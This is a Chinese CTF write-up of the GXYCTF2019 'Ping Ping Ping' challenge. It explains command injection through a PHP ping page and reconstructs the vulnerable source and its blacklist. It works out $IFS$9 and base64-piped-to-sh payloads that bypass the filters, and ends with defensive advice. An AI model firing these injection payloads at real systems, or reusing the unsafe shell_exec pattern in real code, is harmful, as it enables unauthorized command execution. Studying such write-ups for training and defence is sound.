---
title: "Web 命令注入实战：[GXYCTF2019]Ping Ping Ping 详解"
date: 2026-10-25 10:23:00
updated: 2026-10-25 10:23:00
categories:
  - CTF
tags:
  - 命令注入
  - 命令执行
  - 空格绕过
  - base64 编码
  - GXYCTF
description: 从一道最经典的 ping 命令注入题出发，完整走一遍“找注入点 → 摸清过滤 → 逐个绕过 → 读 flag”的过程，重点讲清 $IFS 与 base64 这两种通用绕过手段。
difficulty: 入门
topic: 命令注入
permalink: 2026/10/25/web-ctf-command-injection/
---

{% note primary %}
**一分钟速览**

- **难度**：入门
- **考点**：命令注入、空格过滤绕过、关键字过滤绕过、base64 编码
- **本题关键**：用 `$IFS$9` 解决空格，用 base64 让请求里不出现 `flag`
- **一句话思路**：`echo <base64> | base64 -d | sh`，把整条命令藏进编码里
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：HTTP GET 请求、Linux 常见命令（`ping`、`ls`、`cat`）、shell 基础
- **环境**：CTF 靶场。文中的靶场地址是当时的临时环境，现在多半已失效，请换成自己的靶场或本地环境。
- 本文所有测试仅用于**授权靶场和教学**，请勿对未授权的站点进行任何测试。
{% endnote %}

{% note default %}
**做题路线**

`找注入点` → `确认分隔符` → `摸黑名单` → `解决空格` → `解决关键字` → `编码兜底` → `读 flag`
{% endnote %}

## 0. 先补一点基础

### 0.1 命令注入是怎么产生的

后端把用户输入直接拼进了一条系统命令里，例如：

```php
$ip = $_GET['ip'];
$a = shell_exec("ping -c 4 " . $ip);
echo $a;
```

正常输入 `127.0.0.1` 时执行：

```sh
ping -c 4 127.0.0.1
```

但只要输入里带上 shell 的分隔符，后面的内容就会被当成**另一条命令**：

```sh
ping -c 4 127.0.0.1; ls
```

| 用户输入 | 拼出来的命令 | 实际执行 |
| --- | --- | --- |
| `127.0.0.1` | `ping -c 4 127.0.0.1` | 只 ping |
| `127.0.0.1;ls` | `ping -c 4 127.0.0.1;ls` | ping + 列目录 |
| `127.0.0.1;cat flag.php` | `ping -c 4 127.0.0.1;cat flag.php` | ping + 读文件 |

这就是命令注入。和 SQL 注入一样，本质是**用户输入越界，从数据变成了代码**；区别只是“解释器”从数据库换成了 shell。

> 一句话记：**看到参数被拼进命令，就先试分隔符。**

### 0.2 shell 的几种分隔符

| 写法 | 含义 | 示例 |
| --- | --- | --- |
| `;` | 顺序执行，前一条成功与否都继续 | `127.0.0.1;id` |
| `\|` | 管道，前一条的输出作为后一条的输入 | `127.0.0.1\|id` |
| `&&` | 前一条成功才执行后一条 | `127.0.0.1&&id` |
| `\|\|` | 前一条失败才执行后一条 | `127.0.0.1\|\|id` |
| `` `cmd` `` | 命令替换，先执行再把结果替换进来 | `` ping `id` `` |
| `$()` | 同命令替换 | `ping $(id)` |

{% note info %}
本题的符号黑名单里有 `&`，但**没有** `;` 和 `|`，所以从 `;` 入手。
{% endnote %}

### 0.3 空格被过滤了怎么办：$IFS

shell 里有一个内部变量 `$IFS`（Internal Field Separator），默认值就是空格、Tab 和换行。所以：

```sh
cat$IFS$9flag.php
```

在 shell 看来等价于：

```sh
cat flag.php
```

为什么常见写法是 `$IFS$9`？因为变量名由字母、数字、下划线组成。把三种写法放在一起对比就清楚了：

| 写法 | shell 怎么理解 | 结果 |
| --- | --- | --- |
| `cat$IFS$9flag.php` | `cat` + 空格 + `flag.php` | {% label success@正确 %} |
| `cat$IFSflag.php` | 变量名变成 `IFSflag`，展开为空 | {% label danger@空格消失 %} |
| `cat$IFS$9 flag.php` | `$9` 后面还有一个真实空格 | {% label warning@空格被过滤 %} |

`$9` 是一个不存在的第 9 个位置参数，展开为空字符串，作用只是**切断变量名**，让 `$IFS` 和后面的字符分开。所以 `$IFS$9` 等价于“一个空格”。

{% note success %}
**记忆技巧**：`$IFS` 负责产生空格，`$9` 负责把变量名截断。两个一起用，就是“一个安全的空格”。
{% endnote %}

### 0.4 关键字被过滤了怎么办：换个表达方式

黑名单过滤（`preg_match` 匹配 `flag`、`bash` 之类）通常只看**原始字符串**。绕过的基本思路是：**让请求里不出现关键字，但让执行时出现。**

| 思路 | 做法 | 本题是否可用 |
| --- | --- | --- |
| 大小写 | `FLAG`、`Flag` | ❌ 能绕正则，但 Linux 文件名区分大小写，`FLAG.php` 不存在 |
| 变量拼接 | `a=f;b=lag` | ❌ 被顺序敏感的正则拦住 |
| 命令替换 | `` `ls` `` 展开文件名 | 思路可用，但输出不精确 |
| 通配符 | `fla?.php`、`fla*g.php` | ❌ `?`、`*` 在黑名单 |
| **编码** | 整条命令 base64 | ✅ 最通用、最稳 |

本题最终走的是最后一条：**把整条命令做 base64，交给服务器解码执行。**

## 1. [GXYCTF2019]Ping Ping Ping

### 1.1 观察题目

打开靶机，首页只有一行：

```text
/?ip=
```

响应头里能看到 `X-Powered-By: PHP/5.6.40`，说明是 PHP 后端。这行 `/?ip=` 相当于出题人把参数名直接写在脸上了。

带上参数请求：

```http
GET /?ip=127.0.0.1 HTTP/1.1
```

返回：

```text
<pre>PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.036 ms
...
--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
```

`-c 4`、busybox 风格的输出，基本可以确定后端执行的是 `ping -c 4 $ip`。

### 1.2 确认命令注入

追加一条 `ls`：

```http
GET /?ip=127.0.0.1;ls HTTP/1.1
```

ping 的输出后面多出了目录列表：

```text
flag.php
index.php
```

注入成立，而且目标文件就在眼前。

{% note success %}
到这里先别急着读文件。**先摸清过滤规则**，否则每换一个 payload 都要重新猜为什么失败。
{% endnote %}

### 1.3 用报错信息反推过滤规则

这一步不要盲试。每发一个“问题输入”，观察报错，就能一点点把黑名单拼出来。

| 测试 payload | 返回 | 推论 |
| --- | --- | --- |
| `127.0.0.1;cat flag.php` | `fxck your space!` | 空格被过滤 |
| `127.0.0.1;ls /` | `1fxck your symbol!` | `/` 被过滤；前面那个 `1` 是 `preg_match` 返回的匹配结果 |
| `127.0.0.1;echo flag` | `fxck your space!` | 同时命中两条规则时，先报空格 |
| `127.0.0.1;echo$IFS$9flag` | `fxck your flag!` | `flag` 关键字被正则拦截 |

{% note warning %}
注意第三行：同一个请求里既有空格又有 `flag`，返回的却是空格错误。说明**检查是有先后顺序的**，这能帮我们还原出源码结构。
{% endnote %}

### 1.4 还原后端源码

根据行为，这题和 GXYCTF2019 原题的公开源码一致，大致是：

```php
<?php
if (isset($_GET['ip'])) {
    $ip = $_GET['ip'];

    // 1. 危险符号、控制字符
    if (preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)) {
        echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|/", $ip, $match);
        die("fxck your symbol!");
    }
    // 2. 空格
    else if (preg_match("/ /", $ip)) {
        die("fxck your space!");
    }
    // 3. bash
    else if (preg_match("/bash/", $ip)) {
        die("fxck your bash!");
    }
    // 4. flag（按顺序出现 f、l、a、g 就拦截）
    else if (preg_match("/.*f.*l.*a.*g.*/", $ip)) {
        die("fxck your flag!");
    }

    $a = shell_exec("ping -c 4 " . $ip);
    echo "<pre>";
    print_r($a);
}
```

过滤清单可以总结成一张表：

| 类别 | 被过滤的内容 |
| --- | --- |
| 符号 | `&` `/` `?` `*` `<` `>` `'` `"` `\` `(` `)` `[` `]` `{` `}` 加控制字符 |
| 空格 | 普通空格 |
| 关键字 | `bash`、`flag` |
| 正则特点 | `flag` 不要求连续，f、l、a、g **按顺序**出现就命中 |

{% note danger %}
第 4 条最阴：`.*f.*l.*a.*g.*` 不要求 `flag` 连续，只要 f、l、a、g **按顺序**出现就算命中。这一点直接决定了后面很多“聪明写法”会失败。
{% endnote %}

### 1.5 逐个试绕过

先明确目标命令是 `cat flag.php`，然后分别解决“空格”和“flag”两关。

| 尝试 | 结果 |
| --- | --- |
| `cat$IFS$9flag.php` | {% label danger@失败 %} 原始串里就有 `flag`，中招 |
| `cat$IFS$9fla?.php` | {% label danger@失败 %} `?` 在黑名单 |
| `cat$IFS$9fla*g.php` | {% label danger@失败 %} `*` 在黑名单 |
| `cat$IFS$9fla\g.php` | {% label danger@失败 %} `\` 在黑名单 |
| `cat$IFS$9${...}` | {% label danger@失败 %} `{ }` 在黑名单 |
| `a=f;b=lag;cat$IFS$9$a$b.php` | {% label danger@失败 %} `a=f;b=lag` 里按顺序出现 f、l、a、g，依然命中正则 |
| ``cat$IFS$9`ls` `` | {% label warning@思路可用 %} 会把目录下所有文件都打印出来（见 1.7） |

到这里结论很清楚了：**逐个字符做文章，绕不过顺序敏感的正则。** 换一个维度——**不传明文，传编码。**

### 1.6 最终 payload：base64 整条命令

把要执行的命令整体编码：

```sh
$ printf 'cat flag.php' | base64
Y2F0IGZsYWcucGhw
```

得到 `Y2F0IGZsYWcucGhw`。检查一下：里面没有空格，没有黑名单符号，也没有按顺序出现的 f、l、a、g，所有检查都能过。

再拼一条“解码并执行”的链路：

```text
echo <b64>  ──►  base64 -d  ──►  sh
输出密文          解码成命令         执行命令
```

| 组件 | 作用 |
| --- | --- |
| `echo Y2F0...` | 输出密文 |
| `base64 -d` | 解码回 `cat flag.php` |
| `\| sh` | 让 shell 从标准输入读取并执行这条命令 |

把空格换成 `$IFS$9`，接在 ping 后面：

```text
?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
```

服务器实际执行的命令是：

```sh
ping -c 4 127.0.0.1; echo Y2F0IGZsYWcucGhw | base64 -d | sh
```

{% note warning %}
注意 `echo$IFS$9Y2F0...` 里 `$9` 的作用：如果没有 `$9`，shell 会把 `$IFSY2F0IGZsYWcucGhw` 整个当成变量名，展开成空，密文就丢了。
{% endnote %}

用 curl 发请求（URL 用**单引号**包住，否则本地的 shell 会先把 `$IFS` 展开成空）：

```bash
curl 'http://target/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh'
```

如果 URL 需要显式编码，`;` 写成 `%3B`，`$` 写成 `%24`，`|` 写成 `%7C`：

```text
?ip=127.0.0.1%3Becho%24IFS%249Y2F0IGZsYWcucGhw%7Cbase64%24IFS%249-d%7Csh
```

### 1.7 拿到 flag

返回结果里，ping 的输出后面跟着 `flag.php` 的源码：

```php
<?php
$flag = "CTF2{f7f9783e-54fa-4b75-a358-57b5b95b1e6f}";
?>
```

完整 flag：

```text
CTF2{f7f9783e-54fa-4b75-a358-57b5b95b1e6f}
```

> 注：不同平台复刻这道题时，flag 内容会不一样，以自己靶场里读到的为准。

{% note info %}
**延伸思路（未在本题实测）**

本题只禁了 `bash`，没禁反引号。理论上可以写：

```text
?ip=127.0.0.1;cat$IFS$9`ls`
```

`ls` 的输出是 `flag.php` 和 `index.php` 两行，命令替换后会被拆成两个参数，等价于 `cat flag.php index.php`。这样请求里完全不出现 `flag`。缺点是会把 `index.php` 也打印出来，输出更长；而且是否按行拆分取决于 shell 的 IFS 行为，换了环境未必成立。相比之下，base64 方案更稳定、更通用。
{% endnote %}

## 2. 完整流程速查表

| 步骤 | 目的 | 操作 |
| --- | --- | --- |
| 1 | 确认功能 | `?ip=127.0.0.1`，看是否执行 ping |
| 2 | 确认注入 | `?ip=127.0.0.1;ls`，找可用分隔符 |
| 3 | 摸黑名单 | 逐个发空格、符号、关键字，读报错 |
| 4 | 还原过滤顺序 | 一次命中多条规则，看先报哪个 |
| 5 | 解决空格 | `$IFS` / `$IFS$9` |
| 6 | 解决关键字 | base64 编码整条命令 |
| 7 | 搭建执行链 | `echo <b64> \| base64 -d \| sh` |
| 8 | 读文件 | `cat flag.php` |

{% note default %}
**常用小抄**

```text
cat flag.php  →  Y2F0IGZsYWcucGhw
```
{% endnote %}

## 3. 新手常见问题

{% note info **Q1：URL 里的 `;`、`|`、`$` 需要编码吗？** %}
浏览器地址栏通常会自动编码，但用 curl、Burp 时建议显式处理：`;`→`%3B`、`|`→`%7C`、`$`→`%24`、空格→`%20`。用 curl 的 `--data-urlencode` 最省心：

```bash
curl -G 'http://target/' --data-urlencode 'ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh'
```
{% endnote %}

{% note info **Q2：我在 curl 里写 `$IFS`，发出去却变成空了？** %}
因为 `$IFS` 被**本地**的 shell 展开了。URL 要用单引号包住，或者对 `$` 做转义：

```bash
curl 'http://target/?ip=127.0.0.1;echo$IFS$9...'   # 正确
curl "http://target/?ip=127.0.0.1;echo$IFS$9..."    # 错误，双引号会展开
```
{% endnote %}

{% note info **Q3：为什么 `echo flag` 报的是空格错，`echo$IFS$9flag` 才报 flag 错？** %}
因为源码里的检查有顺序：先符号、再空格、再 `bash`、最后 `flag`。只要前面命中，后面的规则就不看了。
{% endnote %}

{% note info **Q4：我把 `flag` 拆成 `a=f;b=lag` 为什么还是被拦？** %}
第 4 条正则是 `/.*f.*l.*a.*g.*/`，检查的是**原始输入字符串**，不要求连续。`a=f;b=lag` 里 f、l、a、g 恰好按顺序出现，照样命中。这也解释了为什么单纯拼变量在这里无效。
{% endnote %}

{% note info **Q5：`$IFS$9` 里的 `$9` 能不能省？** %}
要看后面跟什么。`base64$IFS-d` 可以省，因为 `-` 不是变量名字符，会自然断开；但 `echo$IFS$9Y2F0...` 不能省，否则 `IFSY2F0...` 会被当成一个变量名。**保险起见，一律写 `$IFS$9`。**
{% endnote %}

{% note info **Q6：为什么用 `sh` 不用 `bash`？** %}
源码里过滤了字符串 `bash`。`sh` 不在黑名单里，而且足够执行 `cat`。
{% endnote %}

{% note info **Q7：`base64 -d` 解码出来为什么能执行？** %}
因为后面接了 `| sh`。管道把解码后的文本送到 `sh` 的标准输入，`sh` 会把读到的内容当命令执行。单独 `base64 -d` 只是打印，不会执行。
{% endnote %}

{% note info **Q8：这个 payload 换个环境还能用吗？** %}
思路通用，细节要重新摸。不同题目过滤的符号、关键字不同：有的禁 `;`，有的禁 `$`，有的把 `base64` 也禁了。步骤永远是：**先摸清黑名单，再找等价写法，最后用编码兜底。**
{% endnote %}

{% note info **Q9：靶场地址打不开了？** %}
在线靶场地址是临时分配的，过期失效很正常。可以在本地搭一个带命令注入的练习环境，payload 思路不变。
{% endnote %}

## 4. 顺手聊聊怎么防

命令注入最难防的地方在于：黑名单永远有遗漏。真正靠谱的做法是不让用户输入进入 shell。

| 优先级 | 措施 | 说明 |
| --- | --- | --- |
| ★★★ | **能用 API 就别用 shell** | 执行 ping 可以用现成的库，而不是 `shell_exec("ping ...")` |
| ★★★ | **参数不要过 shell** | `proc_open` 用数组传参，或 `escapeshellarg()` 逐个转义 |
| ★★★ | **严格白名单校验** | 这个场景里输入应该是一个 IP |
| ★★☆ | **黑名单只当兜底** | 禁了空格还有 `$IFS`，禁了关键字还有 base64 |
| ★★☆ | **降低权限** | Web 进程单独建用户，`disable_functions` 关掉 `shell_exec`、`system`、`exec` 等 |
| ★☆☆ | **不要回显命令输出和报错** | 报错和 ping 回显等于把规则告诉攻击者 |

必须调外部命令时，可以这样写：

```php
$ip = escapeshellarg($_GET['ip']);
$a = shell_exec("ping -c 4 " . $ip);
```

或者直接做白名单校验：

```php
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    exit('invalid ip');
}
```

{% note success %}
**一条原则**：用户输入可以是参数，但永远不该成为命令的一部分。黑名单只是补丁，白名单和“不过 shell”才是正解。
{% endnote %}

## 5. 总结

这道题虽然只有一关 ping，但把命令注入的完整套路都串了一遍：

- **注入点**：参数被拼进 `shell_exec("ping -c 4 " . $ip)`；
- **入口**：`;` 不在黑名单，一句话就能执行任意命令；
- **第一关空格**：`$IFS` 是 shell 自带的“空格别名”，`$9` 用来切断变量名；
- **第二关关键字**：顺序敏感的正则让字母拆分失效，base64 把整条命令编码，从“字符层面”跳出过滤；
- **执行链**：`echo <b64> | base64 -d | sh` 是绕过关键字过滤的经典组合拳。

> 通用套路可以记成一句话：
>
> **找注入点 → 确认分隔符 → 摸黑名单 → 找等价写法 → 编码兜底**

最后再强调一遍：这些技巧只适合在授权靶场里练习。真实项目里，防住它的办法只有一个——**别让用户输入进入 shell。**
